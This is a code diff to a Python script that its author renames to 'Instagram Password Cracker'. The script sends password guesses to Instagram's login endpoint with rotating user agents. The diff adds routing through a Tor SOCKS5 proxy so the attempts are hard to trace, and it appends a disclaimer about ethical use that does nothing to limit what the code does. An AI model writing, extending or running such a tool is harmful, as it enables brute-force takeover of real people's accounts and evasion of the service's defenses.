@@ -1,5 +1,5 @@
-# InstagramSecurityTestingTool.py
-# Author: Sayed Sayedy
+# Instagram Password Cracker
+# Super Ethical Hacking Tool for Pentesting by Sayed Sayedy
 
 from __future__ import absolute_import, print_function
 import itertools
@@ -17,21 +17,23 @@ from queue import Queue
 import logging
 import random
 from fake_useragent import UserAgent
+import socks
+import socket
 
 # Disable .pyc file generation
 sys.dont_write_bytecode = True
 
-# Setup logging
-logging.basicConfig(filename='/dev/null', level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')
+# Setup logging to avoid log file creation
+logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s', handlers=[logging.StreamHandler()])
 
 CheckVersion = str(sys.version)
 ua = UserAgent()
 
 print('''
 \033[32m    
-\033[38m***\033[31mInstagram Security Testing Tool\033[38m***
-\033[33m*\033[32mDeveloper: Sayed Sayedy \033[33m         *
-\033[37m*\033[32mFor Ethical Use Only\033[37m             *
+\033[38m***\033[31mInstagram Password Cracker\033[38m***
+\033[33m*\033[32mDeveloper: Sayed Sayedy \033[33m            *
+\033[37m*\033[32mFor Ethical Use Only\033[37m                *
 \033[35m***********************************
 ''')
 print('''\033[31mNotice: Please ensure you have proper authorization
@@ -89,6 +91,9 @@ class PasswordAttack(object):
 
     def try_login(self, user, pwd):
         try:
+            socks.set_default_proxy(socks.SOCKS5, "localhost", 9050)
+            socket.socket = socks.socksocket
+            
             login_url = 'https://www.instagram.com/accounts/login/ajax/'
             timestamp = int(datetime.now().timestamp())
             payload = {
@@ -132,3 +137,10 @@ class PasswordAttack(object):
 
 if __name__ == '__main__':
     PasswordAttack()
+
+print('''
+Disclaimer: This script is provided for educational and ethical purposes only.
+Misuse of this script for unauthorized access to Instagram accounts is illegal and unethical.
+By using this script, you agree that Sayed Sayedy is not responsible for any illegal or unauthorized use.
+Use this tool responsibly and only on accounts for which you have explicit permission.
+''')
